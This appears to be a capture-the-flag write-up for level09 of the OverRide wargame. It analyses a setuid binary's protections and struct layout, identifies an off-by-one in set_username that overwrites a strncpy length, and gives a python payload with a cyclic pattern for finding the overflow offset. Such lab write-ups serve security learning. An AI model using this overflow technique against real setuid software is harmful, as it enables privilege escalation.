Level09 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

Level09 rights:
```Shell
level09@OverRide:~$ ls -la level09 
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

handle_msg:
    - buffer[140]

set_username:
    - copy 40 bytes in buffer + 140.

set_msg:
    - use buffer + 180 as a size.
    - to copy as much bytes in buffer

Buffer seem to be a structure composed of two string and an integer. one string used in set_username (buffer + 140), the other in set_msg (buffer + 0). (buffer + 180) is used as an integer for the strncpy length.

```Shell
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp
```

192 bytes allocated:
    140:    string one
    40:     string two
    4 or 8: integer

possible struct:
    char*   msg[140];
    char*   username[40];
    int     size;

Vulnerability is in set_username, where 41 character in 40 character string username, overflowing in number, allowing us to determine the size of the strncpy in set_msg.

```Shell
python -c 'print("A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")' > /tmp/payload9
```